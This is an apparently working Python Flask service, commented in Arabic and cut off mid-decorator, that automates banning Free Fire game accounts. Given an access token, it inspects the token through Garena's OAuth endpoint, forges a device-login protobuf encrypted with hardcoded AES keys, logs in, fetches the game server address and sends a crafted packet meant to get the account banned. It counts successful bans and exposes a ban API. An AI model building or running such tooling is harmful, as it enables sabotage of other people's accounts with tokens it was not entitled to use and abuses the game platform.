#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import time
import base64
import socket
import requests
import traceback
import warnings
from datetime import datetime, date
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

# استيراد ملفات البروتوبوف
import MajorLogin_res_pb2
from google.protobuf.timestamp_pb2 import Timestamp

warnings.filterwarnings('ignore')

# ========== إعداد Flask ==========
app = Flask(__name__, static_folder='.', static_url_path='')
CORS(app)

# تحديد معدل الطلبات
limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["10 per minute", "100 per hour"]
)

# ========== إحصائيات البوت ==========
stats = {
    'total_bans': 0,
    'today_bans': 0,
    'successful_bans': 0,
    'failed_bans': 0,
    'last_date': date.today().isoformat(),
    'start_time': datetime.now().isoformat()
}

def update_stats(success):
    """تحديث الإحصائيات"""
    today = date.today().isoformat()
    if stats['last_date'] != today:
        stats['today_bans'] = 0
        stats['last_date'] = today
    
    stats['total_bans'] += 1
    stats['today_bans'] += 1
    if success:
        stats['successful_bans'] += 1
    else:
        stats['failed_bans'] += 1

def get_success_rate():
    """حساب نسبة النجاح"""
    if stats['total_bans'] == 0:
        return 100
    return round((stats['successful_bans'] / stats['total_bans']) * 100, 1)

# ========== دوال التشفير والبروتوبوف (نفس الكود الأصلي) ==========
class SimpleProtobuf:
    @staticmethod
    def encode_varint(value):
        result = bytearray()
        while value > 0x7F:
            result.append((value & 0x7F) | 0x80)
            value >>= 7
        result.append(value & 0x7F)
        return bytes(result)
    
    @staticmethod
    def decode_varint(data, start_index=0):
        value = 0
        shift = 0
        index = start_index
        while index < len(data):
            byte = data[index]
            index += 1
            value |= (byte & 0x7F) << shift
            if not (byte & 0x80):
                break
            shift += 7
        return value, index
    
    @staticmethod
    def parse_protobuf(data):
        result = {}
        index = 0
        while index < len(data):
            tag = data[index]
            field_num = tag >> 3
            wire_type = tag & 0x07
            index += 1
            if wire_type == 0:
                value, index = SimpleProtobuf.decode_varint(data, index)
                result[field_num] = value
            elif wire_type == 2:
                length, index = SimpleProtobuf.decode_varint(data, index)
                if index + length <= len(data):
                    value_bytes = data[index:index+length]
                    index += length
                    try:
                        result[field_num] = value_bytes.decode('utf-8')
                    except:
                        result[field_num] = value_bytes
            else:
                break
        return result
    
    @staticmethod
    def encode_string(field_number, value):
        if isinstance(value, str):
            value = value.encode('utf-8')
        result = bytearray()
        result.extend(SimpleProtobuf.encode_varint((field_number << 3) | 2))
        result.extend(SimpleProtobuf.encode_varint(len(value)))
        result.extend(value)
        return bytes(result)
    
    @staticmethod
    def encode_int32(field_number, value):
        result = bytearray()
        result.extend(SimpleProtobuf.encode_varint((field_number << 3) | 0))
        result.extend(SimpleProtobuf.encode_varint(value))
        return bytes(result)
    
    @staticmethod
    def create_login_payload(open_id, access_token, platform):
        payload = bytearray()
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        payload.extend(SimpleProtobuf.encode_string(3, current_time))
        payload.extend(SimpleProtobuf.encode_string(4, 'free fire'))
        payload.extend(SimpleProtobuf.encode_int32(5, 1))
        payload.extend(SimpleProtobuf.encode_string(7, '2.111.2'))
        payload.extend(SimpleProtobuf.encode_string(8, 'Android OS 12 / API-31 (SP1A.210812.016/T505NDXS6CXB1)'))
        payload.extend(SimpleProtobuf.encode_string(9, 'Handheld'))
        payload.extend(SimpleProtobuf.encode_string(10, 'we'))
        payload.extend(SimpleProtobuf.encode_string(11, 'WIFI'))
        payload.extend(SimpleProtobuf.encode_int32(12, 1334))
        payload.extend(SimpleProtobuf.encode_int32(13, 800))
        payload.extend(SimpleProtobuf.encode_string(14, '225'))
        payload.extend(SimpleProtobuf.encode_string(15, 'ARM64 FP ASIMD AES | 4032 | 8'))
        payload.extend(SimpleProtobuf.encode_int32(16, 2705))
        payload.extend(SimpleProtobuf.encode_string(17, 'Adreno (TM) 610'))
        payload.extend(SimpleProtobuf.encode_string(18, 'OpenGL ES 3.2 V@0502.0 (GIT@5eaa426211, I07ee46fc66, 1633700387) (Date:10/08/21)'))
        payload.extend(SimpleProtobuf.encode_string(19, 'Google|dbc5b426-9715-454a-9466-6c82e151d407'))
        payload.extend(SimpleProtobuf.encode_string(20, '154.183.6.12'))
        payload.extend(SimpleProtobuf.encode_string(21, 'ar'))
        payload.extend(SimpleProtobuf.encode_string(22, open_id))
        payload.extend(SimpleProtobuf.encode_string(23, str(platform)))
        payload.extend(SimpleProtobuf.encode_string(24, 'Handheld'))
        payload.extend(SimpleProtobuf.encode_string(25, 'samsung SM-T505N'))
        payload.extend(SimpleProtobuf.encode_string(29, access_token))
        payload.extend(SimpleProtobuf.encode_int32(30, 1))
        payload.extend(SimpleProtobuf.encode_string(41, 'we'))
        payload.extend(SimpleProtobuf.encode_string(42, 'WIFI'))
        payload.extend(SimpleProtobuf.encode_string(57, 'e89b158e4bcf988ebd09eb83f5378e87'))
        payload.extend(SimpleProtobuf.encode_int32(60, 22394))
        payload.extend(SimpleProtobuf.encode_int32(61, 1424))
        payload.extend(SimpleProtobuf.encode_int32(62, 3349))
        payload.extend(SimpleProtobuf.encode_int32(63, 24))
        payload.extend(SimpleProtobuf.encode_int32(64, 1552))
        payload.extend(SimpleProtobuf.encode_int32(65, 22394))
        payload.extend(SimpleProtobuf.encode_int32(66, 1552))
        payload.extend(SimpleProtobuf.encode_int32(67, 22394))
        payload.extend(SimpleProtobuf.encode_int32(73, 1))
        payload.extend(SimpleProtobuf.encode_string(74, '/data/app/~~lqYdjEs9bd43CagTaQ9JPg==/com.dts.freefiremax-i72Sh_-sI0zZHs5Bw6aufg==/lib/arm64'))
        payload.extend(SimpleProtobuf.encode_int32(76, 2))
        payload.extend(SimpleProtobuf.encode_string(77, 'b4d2689433917e66100ba91db790bf37|/data/app/~~lqYdjEs9bd43CagTaQ9JPg==/com.dts.freefiremax-i72Sh_-sI0zZHs5Bw6aufg==/base.apk'))
        payload.extend(SimpleProtobuf.encode_int32(78, 2))
        payload.extend(SimpleProtobuf.encode_int32(79, 2))
        payload.extend(SimpleProtobuf.encode_string(81, '64'))
        payload.extend(SimpleProtobuf.encode_string(83, '2019115296'))
        payload.extend(SimpleProtobuf.encode_int32(85, 1))
        payload.extend(SimpleProtobuf.encode_string(86, 'OpenGLES3'))
        payload.extend(SimpleProtobuf.encode_int32(87, 16383))
        payload.extend(SimpleProtobuf.encode_int32(88, 4))
        payload.extend(SimpleProtobuf.encode_string(90, 'Damanhur'))
        payload.extend(SimpleProtobuf.encode_string(91, 'BH'))
        payload.extend(SimpleProtobuf.encode_int32(92, 31095))
        payload.extend(SimpleProtobuf.encode_string(93, 'android_max'))
        payload.extend(SimpleProtobuf.encode_string(94, 'KqsHTzpfADfqKnEg/KMctJLElsm8bN2M4ts0zq+ifY+560USyjMSDL386RFrwRloT0ZSbMxEuM+Y4FSvjghQQZXWWpY='))
        payload.extend(SimpleProtobuf.encode_int32(97, 1))
        payload.extend(SimpleProtobuf.encode_int32(98, 1))
        payload.extend(SimpleProtobuf.encode_string(99, str(platform)))
        payload.extend(SimpleProtobuf.encode_string(100, str(platform)))
        payload.extend(SimpleProtobuf.encode_string(102, ''))
        return bytes(payload)

def b64url_decode(input_str: str) -> bytes:
    rem = len(input_str) % 4
    if rem:
        input_str += '=' * (4 - rem)
    return base64.urlsafe_b64decode(input_str)

def get_available_room(input_text):
    try:
        data = bytes.fromhex(input_text)
        result = {}
        index = 0
        while index < len(data):
            tag = data[index]
            field_num = tag >> 3
            wire_type = tag & 0x07
            index += 1
            if wire_type == 0:
                value, index = SimpleProtobuf.decode_varint(data, index)
                result[str(field_num)] = {"wire_type": "varint", "data": value}
            elif wire_type == 2:
                length, index = SimpleProtobuf.decode_varint(data, index)
                if index + length <= len(data):
                    value_bytes = data[index:index+length]
                    index += length
                    try:
                        result[str(field_num)] = {"wire_type": "string", "data": value_bytes.decode('utf-8')}
                    except:
                        result[str(field_num)] = {"wire_type": "bytes", "data": value_bytes.hex()}
            else:
                break
        return json.dumps(result)
    except:
        return None

def extract_jwt_payload_dict(jwt_s: str):
    try:
        parts = jwt_s.split('.')
        if len(parts) < 2:
            return None
        payload_bytes = b64url_decode(parts[1])
        return json.loads(payload_bytes.decode('utf-8', errors='ignore'))
    except:
        return None

def encrypt_packet(hex_string: str, aes_key, aes_iv) -> str:
    if isinstance(aes_key, str):
        aes_key = bytes.fromhex(aes_key)
    if isinstance(aes_iv, str):
        aes_iv = bytes.fromhex(aes_iv)
    data = bytes.fromhex(hex_string)
    cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
    encrypted = cipher.encrypt(pad(data, AES.block_size))
    return encrypted.hex()

def build_start_packet(account_id: int, timestamp: int, jwt: str, key, iv) -> str:
    encrypted = encrypt_packet(jwt.encode().hex(), key, iv)
    head_len = hex(len(encrypted) // 2)[2:]
    ide_hex = hex(int(account_id))[2:]
    zeros = "0" * (16 - len(ide_hex))
    timestamp_hex = hex(timestamp)[2:].zfill(2)
    head = f"0115{zeros}{ide_hex}{timestamp_hex}00000{head_len}"
    return head + encrypted

def send_once(remote_ip, remote_port, payload_bytes, recv_timeout=5.0):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(recv_timeout)
    try:
        s.connect((remote_ip, remote_port))
        s.sendall(payload_bytes)
        chunks = []
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
        except socket.timeout:
            pass
        return b"".join(chunks)
    finally:
        s.close()

def ban_account(access_token: str):
    """دالة حظر الحساب الرئيسية"""
    try:
        # 1. Inspect token
        inspect_url = f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}"
        headers = {
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "100067.connect.garena.com",
            "User-Agent": "GarenaMSDK/4.0.19P4(G011A ;Android 9;en;US;)"
        }
        resp = requests.get(inspect_url, headers=headers, timeout=10)
        data = resp.json()
        if 'error' in data:
            return False, f"خطأ في التوكن: {data.get('error')}"
        open_id = data.get('open_id')
        platform_ = data.get('platform')
        
        # 2. MajorLogin
        key = b'Yg&tc%DEuh6%Zc^8'
        iv = b'6oyZDr22E3ychjM%'
        pb_data = SimpleProtobuf.create_login_payload(open_id, access_token, str(platform_))
        padded = pad(pb_data, 16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        enc_data = cipher.encrypt(padded)
        
        ml_url = "https://loginbp.ggblueshark.com/MajorLogin"
        ml_headers = {
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-S908E Build/TP1A.220624.014)",
            "Content-Type": "application/octet-stream",
            "X-GA": "v1 1",
            "X-Unity-Version": "2018.4.11f1",
            "ReleaseVersion": "OB52"
        }
        resp_ml = requests.post(ml_url, headers=ml_headers, data=enc_data, timeout=15)
        if not resp_ml.ok:
            return False, f"فشل الاتصال بـ MajorLogin: {resp_ml.status_code}"
        
        cipher_resp = AES.new(key, AES.MODE_CBC, iv)
        try:
            decrypted = unpad(cipher_resp.decrypt(resp_ml.content), 16)
        except:
            decrypted = resp_ml.content
        resp_msg = MajorLogin_res_pb2.MajorLoginRes()
        resp_msg.ParseFromString(decrypted)
        parsed_data = SimpleProtobuf.parse_protobuf(decrypted)
        
        if not resp_msg.account_jwt:
            return False, "فشل الحصول على JWT"
        
        field_21_value = parsed_data.get(21, None)
        if field_21_value:
            ts = Timestamp()
            ts.FromNanoseconds(field_21_value)
            timetamp = ts.seconds * 1_000_000_000 + ts.nanos
        else:
            payload = extract_jwt_payload_dict(resp_msg.account_jwt)
            exp = int(payload.get("exp", 0))
            ts = Timestamp()
            ts.FromNanoseconds(exp * 1_000_000_000)
            timetamp = ts.seconds * 1_000_000_000 + ts.nanos
        
        # 3. GetLoginData
        gld_url = "https://clientbp.ggblueshark.com/GetLoginData"
        gld_headers = {
            'Authorization': f'Bearer {resp_msg.account_jwt}',
            'X-Unity-Version': '2018.4.11f1',
            'X-GA': 'v1 1',
            'ReleaseVersion': 'OB52',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)',
        }
        r2 = requests.post(gld_url, headers=gld_headers, data=enc_data, timeout=12, verify=False)
        if r2.status_code != 200:
            return False, f"فشل GetLoginData: {r2.status_code}"
        
        hex_data = r2.content.hex()
        json_res = get_available_room(hex_data)
        if not json_res:
            return False, "فشل في تحليل بيانات السيرفر"
        parsed = json.loads(json_res)
        if '14' not in parsed or 'data' not in parsed['14']:
            return False, "لم يتم العثور على عنوان السيرفر"
        online_address = parsed['14']['data']
        online_ip = online_address[:-6]
        online_port = int(online_address[-5:])
        
        payload_jwt = extract_jwt_payload_dict(resp_msg.account_jwt)
        if not payload_jwt:
            return False, "JWT غير صالح"
        account_id = int(payload_jwt.get("account_id", 0))
        
        final_hex = build_start_packet(account_id, timetamp, resp_msg.account_jwt, resp_msg.key, resp_msg.iv)
        if not final_hex:
            return False, "فشل بناء الحزمة"
        
        payload_bytes = bytes.fromhex(final_hex)
        response = send_once(online_ip, online_port, payload_bytes, recv_timeout=5.0)
        if response:
            return True, "✅ تم حظر الحساب بنجاح!"
        else:
            return False, "تم إرسال الحزمة ولكن لم يتم استلام رد"
    except Exception as e:
        return False, f"خطأ: {str(e)}"

# ========== مسارات API ==========
@app.route('/')
def index():
    """الصفحة الرئيسية"""
    return send_from_directory('.', 'index.html')

@app.route('/api/ban', methods=['POST'])
@limiter.limit